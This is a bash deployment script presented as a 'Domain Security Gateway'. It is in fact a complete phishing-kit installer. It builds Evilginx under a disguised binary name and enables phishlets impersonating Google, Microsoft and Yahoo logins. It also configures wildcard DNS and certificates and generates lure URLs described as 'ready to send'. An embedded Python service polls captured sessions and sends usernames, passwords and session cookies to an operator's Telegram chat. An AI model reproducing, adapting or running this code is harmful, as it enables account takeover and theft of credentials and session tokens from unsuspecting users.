#!/bin/bash
# ============================================================================
# Domain Security Gateway - Complete Automated Installer
# ============================================================================
# Usage: sudo bash deploy.sh --domain example.com --vps-ip 1.2.3.4 --api-token CF-xxxxx
# ============================================================================

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
DOMAIN=""
VPS_IP=""
API_TOKEN=""
NOTIFY_TOKEN=""
NOTIFY_ID=""
HTTP_PORT=80
HTTPS_PORT=443
UNAUTH_URL="https://www.google.com"
WEBHOOK_SECRET=$(openssl rand -hex 16)
APP_DIR="/opt/gateway"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Helper functions
log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }
info() { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${CYAN}[✓]${NC} $1"; }

print_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                    Domain Security Gateway v3.0                      ║
    ║                   Complete Automated Deployment                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_help() {
    cat << EOF

${GREEN}USAGE:${NC}
  sudo bash deploy.sh --domain DOMAIN --vps-ip IP --api-token TOKEN

${GREEN}REQUIRED:${NC}
  --domain DOMAIN           Your domain name
  --vps-ip IP               Server IP address
  --api-token TOKEN         Cloudflare API token (DNS:Edit permission)

${GREEN}OPTIONAL:${NC}
  --notify-token TOKEN      Telegram bot token
  --notify-id ID            Telegram chat ID

${GREEN}EXAMPLE:${NC}
  sudo bash deploy.sh \\
    --domain "example.com" \\
    --vps-ip "192.168.1.1" \\
    --api-token "CF-xxxxx" \\
    --notify-token "123456:ABC-def" \\
    --notify-id "123456789"

EOF
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --domain) DOMAIN="$2"; shift 2 ;;
            --vps-ip) VPS_IP="$2"; shift 2 ;;
            --api-token) API_TOKEN="$2"; shift 2 ;;
            --notify-token) NOTIFY_TOKEN="$2"; shift 2 ;;
            --notify-id) NOTIFY_ID="$2"; shift 2 ;;
            --help|-h) show_help; exit 0 ;;
            *) error "Unknown argument: $1" ;;
        esac
    done

    if [[ -z "$DOMAIN" ]]; then error "Domain is required"; fi
    if [[ -z "$VPS_IP" ]]; then error "VPS IP is required"; fi
    if [[ -z "$API_TOKEN" ]]; then error "Cloudflare API token is required"; fi
}

# ============================================================================
# PHASE 1: CHECK LOCAL FILES
# ============================================================================
phase_check_files() {
    log "Checking local resource files..."
    
    if [[ ! -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
        error "phishlets/google.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/microsoft.yaml" ]]; then
        error "phishlets/microsoft.yaml not found"
    fi
    if [[ ! -f "$SCRIPT_DIR/phishlets/yahoo.yaml" ]]; then
        error "phishlets/yahoo.yaml not found"
    fi
    
    success "Resource files verified (edit these before deployment if needed)"
}

# ============================================================================
# PHASE 2: CLOUDFLARE DNS (WILDCARD)
# ============================================================================
phase_dns() {
    log "Configuring Cloudflare wildcard DNS..."
    
    # Get zone ID
    ZONE_INFO=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
        -H "Authorization: Bearer $API_TOKEN" \
        -H "Content-Type: application/json")
    
    ZONE_ID=$(echo "$ZONE_INFO" | jq -r '.result[0].id')
    ZONE_SUCCESS=$(echo "$ZONE_INFO" | jq -r '.success')

    if [[ "$ZONE_ID" == "null" ]] || [[ -z "$ZONE_ID" ]] || [[ "$ZONE_SUCCESS" != "true" ]]; then
        error "Could not find zone for $DOMAIN or API error: $(echo "$ZONE_INFO" | jq -r '.errors[0].message')"
    fi
    success "Cloudflare Zone ID: $ZONE_ID"
    
    # Function to create or update DNS A record
    upsert_dns_record() {
        local record_name="$1"
        local record_content="$2"
        local record_type="A"
        local proxied="false"
        local ttl=120

        log "Upserting DNS record: $record_name -> $record_content"

        # Check if record exists
        local existing_record=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records?name=$record_name&type=$record_type" \
            -H "Authorization: Bearer $API_TOKEN" \
            -H "Content-Type: application/json")
        
        local record_id=$(echo "$existing_record" | jq -r '.result[0].id')
        local record_exists=$(echo "$existing_record" | jq -r '.success')

        if [[ "$record_id" != "null" ]] && [[ "$record_exists" == "true" ]]; then
            # Update existing record
            local response=$(curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records/$record_id" \
                -H "Authorization: Bearer $API_TOKEN" \
                -H "Content-Type: application/json" \
                -d "{\"type\":\"$record_type\",\"name\":\"$record_name\",\"content\":\"$record_content\",\"ttl\":$ttl,\"proxied\":$proxied}")
        else
            # Create new record
            local response=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records" \
                -H "Authorization: Bearer $API_TOKEN" \
                -H "Content-Type: application/json" \
                -d "{\"type\":\"$record_type\",\"name\":\"$record_name\",\"content\":\"$record_content\",\"ttl\":$ttl,\"proxied\":$proxied}")
        fi
        
        echo "$response" | jq -e '.success == true' >/dev/null || error "Failed to upsert DNS record $record_name: $(echo "$response" | jq -r '.errors[0].message')"
    }
    
    upsert_dns_record "*.$DOMAIN" "$VPS_IP"
    upsert_dns_record "$DOMAIN" "$VPS_IP"
    
    success "Wildcard DNS configured for *.$DOMAIN and $DOMAIN -> $VPS_IP"
}

# ============================================================================
# PHASE 3: WILDCARD SSL CERTIFICATE
# ============================================================================
phase_ssl() {
    log "Obtaining wildcard SSL certificate..."
    # Ensure certbot and cloudflare plugin are installed
    apt-get update -y >/dev/null
    apt-get install -y certbot python3-certbot-dns-cloudflare >/dev/null
    
    cat > /etc/letsencrypt/cloudflare.ini << EOF
dns_cloudflare_api_token = $API_TOKEN
EOF
    chmod 600 /etc/letsencrypt/cloudflare.ini
    
    # Attempt to obtain certificate
    if certbot certonly --dns-cloudflare \
        --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
        --dns-cloudflare-propagation-seconds 90 \
        --non-interactive --agree-tos --email "admin@$DOMAIN" \
        -d "$DOMAIN" -d "*.$DOMAIN"; then

        mkdir -p "$APP_DIR/certs"
        # Copy certificates
        cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
        cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"

        # Create a renewal hook for Certbot
        mkdir -p /etc/letsencrypt/renewal-hooks/post
        cat > "/etc/letsencrypt/renewal-hooks/post/gateway-cert-copy.sh" << RENEWAL_HOOK
#!/bin/bash
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$APP_DIR/certs/$DOMAIN.crt"
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$APP_DIR/certs/$DOMAIN.key"
systemctl restart gateway || true
RENEWAL_HOOK
        chmod +x "/etc/letsencrypt/renewal-hooks/post/gateway-cert-copy.sh"

        success "Wildcard SSL certificate installed"
    else
        warn "SSL failed - continuing with HTTP mode"
        HTTPS_PORT=0
    fi
}

# ============================================================================
# PHASE 4: INSTALL DEPENDENCIES
# ============================================================================
phase_dependencies() {
    log "Installing system dependencies..."
    
    apt-get update -y >/dev/null
    apt-get install -y git curl wget build-essential golang-go openssl jq \
        dnsutils python3 python3-requests expect >/dev/null
    
    if ! command -v go &>/dev/null; then
        wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
        rm -rf /usr/local/go
        tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
        export PATH=$PATH:/usr/local/go/bin
        rm go1.22.0.linux-amd64.tar.gz
    fi
    
    success "Dependencies installed"
}

# ============================================================================
# PHASE 5: BUILD SERVICE
# ============================================================================
phase_build() {
    log "Building core service..."
    
    rm -rf /tmp/.build_cache
    cd /tmp
    git clone https://github.com/kgretzky/evilginx.git .build_cache
    cd .build_cache
    # Obfuscate the binary name during build
    go build -buildvcs=false -o sys-svc 
    
    if [[ ! -f "sys-svc" ]]; then
        error "Build failed - sys-svc binary not found in $(pwd)"
    fi

    mkdir -p "$APP_DIR"/{config,resources,certs,storage,logs,notifications}
    cp sys-svc /usr/local/bin/sys-svc
    chmod +x /usr/local/bin/sys-svc
    
    success "Service built"
}

# ============================================================================
# PHASE 6: DEPLOY RESOURCES FROM LOCAL FILES
# ============================================================================
phase_deploy_resources() {
    log "Deploying resources from local files..."
    
    # Aligned naming with Phishlet Go-templates
    EP1="gw-$(openssl rand -hex 3)"
    EP2="auth-$(openssl rand -hex 3)"
    EP3="portal-$(openssl rand -hex 3)"
    
    echo "$EP1" > "$APP_DIR/.ep1"
    echo "$EP2" > "$APP_DIR/.ep2"
    echo "$EP3" > "$APP_DIR/.ep3"
    
    # Copy from local editable resources
    cp "$SCRIPT_DIR/phishlets/google.yaml" "$APP_DIR/resources/"
    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" "$APP_DIR/resources/"
    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" "$APP_DIR/resources/"
    
    # Enhanced sed to match .EndpointX naming and inject secrets
    sed -i "s/{{.Domain}}/$DOMAIN/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.Endpoint1}}/$EP1/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.Endpoint2}}/$EP2/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.Endpoint3}}/$EP3/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.VpsIp}}/$VPS_IP/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" "$APP_DIR/resources/"*.yaml
    sed -i "s/{{.AppPort}}/$HTTP_PORT/g" "$APP_DIR/resources/"*.yaml
    
    success "Resources deployed"
    log "  Endpoint 1: $EP1.$DOMAIN"
}

# ============================================================================
# PHASE 7: CREATE CONFIGURATION
# ============================================================================
phase_config() {
    log "Creating configuration..."
    
    cat > "$APP_DIR/config/config.yaml" << EOF
daemon: false
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: $HTTP_PORT
https_port: $HTTPS_PORT # Will be 0 if SSL failed
unauth_url: $UNAUTH_URL
dns_port: 0
autocert: false
phishlets_path: $APP_DIR/resources
cert_path: $APP_DIR/certs
database: $APP_DIR/storage/data.db
EOF

    success "Configuration created"
}

# ============================================================================
# PHASE 8: TELEGRAM NOTIFICATION SERVICE (CREDENTIALS + COOKIES)
# ============================================================================
phase_notifications() {
    if [[ -n "$NOTIFY_TOKEN" ]] && [[ -n "$NOTIFY_ID" ]]; then
        log "Setting up Telegram notifications..."
        
        cat > "$APP_DIR/notifications/notify.py" << 'EOF'
#!/usr/bin/env python3
import os, time, sqlite3, requests, json
from datetime import datetime

TOKEN = "{{TOKEN}}"
CHAT = "{{CHAT}}"
DB_PATH = "/opt/gateway/storage/data.db"
LAST_FILE = "/opt/gateway/notifications/last_id.txt"

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT, "text": text, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print(f"Send error: {e}")

def send_file(content, filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        files = {'document': (filename, content)}
        data = {'chat_id': CHAT, 'caption': filename}
        requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        print(f"File send error: {e}")

def get_last_id():
    if os.path.exists(LAST_FILE):
        with open(LAST_FILE, 'r') as f:
            return int(f.read().strip())
    return 0

def save_last_id(last_id):
    with open(LAST_FILE, 'w') as f:
        f.write(str(last_id))

last_id = get_last_id()

while True:
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Check for new sessions (credentials captured) - Using parameterized query
        cursor.execute("""
            SELECT id, phishlet, username, password, auth_token, ip, created_at 
            FROM sessions WHERE id > ? ORDER BY id ASC
        """, (last_id,))
        
        rows = cursor.fetchall()
        
        for row in rows:
            sid, service, username, password, token, ip, timestamp = row
            
            # Send credentials notification
            msg = f"""🔐 <b>LOGIN CREDENTIALS CAPTURED</b>

📧 <b>Service:</b> {service}
👤 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
🌐 <b>IP Address:</b> {ip}
⏰ <b>Time:</b> {timestamp}"""
            
            send_message(msg)
            
            # If session cookies exist, send them as file
            if token and len(token) > 10:
                cookie_file = f"{service}_{username}_session.txt"
                cookie_content = f"""Service: {service}
Username: {username}
Time: {timestamp}
IP: {ip}

=== SESSION COOKIES ===
{token}
"""
                send_file(cookie_content.encode(), cookie_file)
            
            last_id = sid
            save_last_id(last_id)
        
        conn.close()
        
    except Exception as e:
        # Log specific errors for debugging
        print(f"[{datetime.now()}] Notification service error: {e}")
        # Optionally, add more specific exception handling for sqlite3.OperationalError etc.
    
    time.sleep(3)
EOF
        
        sed -i "s/{{TOKEN}}/$NOTIFY_TOKEN/g" "$APP_DIR/notifications/notify.py"
        sed -i "s/{{CHAT}}/$NOTIFY_ID/g" "$APP_DIR/notifications/notify.py"
        chmod +x "$APP_DIR/notifications/notify.py"
        
        cat > /etc/systemd/system/gateway-notify.service << EOF
[Unit]
Description=Gateway Notification Service
After=network.target gateway.service

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR/notifications
ExecStart=/usr/bin/python3 $APP_DIR/notifications/notify.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

        systemctl daemon-reload
        systemctl enable gateway-notify
        systemctl start gateway-notify
        success "Telegram notifications active (credentials + session cookies)"
    else
        info "Skipping Telegram notifications (no credentials provided)"
    fi
}

# ============================================================================
# PHASE 9: SYSTEMD SERVICE
# ============================================================================
phase_service() {
    log "Creating system service..."
    
    cat > /etc/systemd/system/gateway.service << EOF
[Unit]
Description=Domain Gateway Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$APP_DIR
ExecStart=/usr/local/bin/sys-svc -c $APP_DIR/config -p $APP_DIR/resources
Restart=always
RestartSec=5
NoNewPrivileges=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable gateway
    systemctl start gateway
    
    sleep 3
    success "Service started"
}

# ============================================================================
# PHASE 10: CONFIGURE AND GENERATE REAL URLs
# ============================================================================
phase_generate_urls() {
    log "Configuring service and generating access URLs..."
    
    EP1=$(cat "$APP_DIR/.ep1")
    EP2=$(cat "$APP_DIR/.ep2")
    EP3=$(cat "$APP_DIR/.ep3")
    
    # Create expect script for automatic configuration
    cat > /tmp/configure.exp << 'EOF'
#!/usr/bin/expect -f
set timeout 30
log_user 0
spawn /usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/resources

expect "gateway>" { send "config domain $env(DOMAIN)\r" }
expect "gateway>" { send "config ipv4 external $env(VPS_IP)\r" }
# Enable bot protection
expect "gateway>" { send "blacklist on\r" }

expect "gateway>" { send "phishlets hostname yahoo $env(EP1).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable yahoo\r" }
expect "gateway>" { send "phishlets hostname microsoft $env(EP2).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable microsoft\r" }
expect "gateway>" { send "phishlets hostname google $env(EP3).$env(DOMAIN)\r" }
expect "gateway>" { send "phishlets enable google\r" }

expect "gateway>" { send "lures create yahoo\r" }
expect -re "created lure with ID: (\\d+)" { set yid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $yid\r" }
expect -re "(https://[^\\r]+)" { set yurl $expect_out(1,string) }

expect "gateway>" { send "lures create microsoft\r" }
expect -re "created lure with ID: (\\d+)" { set mid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $mid\r" }
expect -re "(https://[^\\r]+)" { set murl $expect_out(1,string) }

expect "gateway>" { send "lures create google\r" }
expect -re "created lure with ID: (\\d+)" { set gid $expect_out(1,string) }
expect "gateway>" { send "lures get-url $gid\r" }
expect -re "(https://[^\\r]+)" { set gurl $expect_out(1,string) }

expect "gateway>" { send "exit\r" }

puts "Y_URL=$yurl"
puts "M_URL=$murl"
puts "G_URL=$gurl"
expect eof
EOF

    chmod +x /tmp/configure.exp
    export DOMAIN VPS_IP EP1 EP2 EP3
    output=$(/tmp/configure.exp 2>/dev/null)
    rm -f /tmp/configure.exp
    
    Y_URL=$(echo "$output" | grep "Y_URL=" | cut -d'=' -f2-)
    M_URL=$(echo "$output" | grep "M_URL=" | cut -d'=' -f2-)
    G_URL=$(echo "$output" | grep "G_URL=" | cut -d'=' -f2-)
    
    cat > "$APP_DIR/access_urls.txt" << EOF
========================================
ACCESS URLs - READY TO USE
========================================

YAHOO:     $Y_URL
MICROSOFT: $M_URL
GOOGLE:    $G_URL

========================================
These URLs are ACTIVE and ready to send
========================================
EOF

    success "Access URLs generated"
}

# ============================================================================
# PHASE 11: SUMMARY
# ============================================================================
print_summary() {
    EP1=$(cat "$APP_DIR/.ep1")
    EP2=$(cat "$APP_DIR/.ep2")
    EP3=$(cat "$APP_DIR/.ep3")
    
    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                    DEPLOYMENT COMPLETE!                         ${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}📧 ACTIVE ACCESS URLs:${NC}"
    echo -e "  ${GREEN}Yahoo:${NC}     $Y_URL"
    echo -e "  ${GREEN}Microsoft:${NC}  $M_URL"
    echo -e "  ${GREEN}Google:${NC}     $G_URL"
    echo ""
    echo -e "${CYAN}🔧 MANAGEMENT COMMANDS:${NC}"
    echo -e "  Status:     systemctl status gateway"
    echo -e "  Logs:       journalctl -u gateway -f"
    echo -e "  Restart:    systemctl restart gateway"
    echo -e "  Stop:       systemctl stop gateway"
    echo ""
    echo -e "${CYAN}📁 EDIT RESOURCES (if needed):${NC}"
    echo -e "  nano $APP_DIR/resources/google.yaml"
    echo -e "  nano $APP_DIR/resources/microsoft.yaml"
    echo -e "  nano $APP_DIR/resources/yahoo.yaml"
    echo -e "  Then: systemctl restart gateway"
    echo ""
    if [[ -n "$NOTIFY_TOKEN" ]]; then
        echo -e "${CYAN}🤖 TELEGRAM NOTIFICATIONS: ACTIVE${NC}"
        echo -e "  - Credentials sent to Telegram"
        echo -e "  - Session cookies sent as files"
        echo -e "  - Logs: journalctl -u gateway-notify -f"
        echo ""
    fi
    echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
main() {
    print_banner
    parse_args "$@"
    phase_check_files
    phase_dns
    phase_ssl
    phase_dependencies
    phase_build
    phase_deploy_resources
    phase_config
    phase_notifications
    phase_service
    phase_generate_urls
    print_summary
}

main "$@"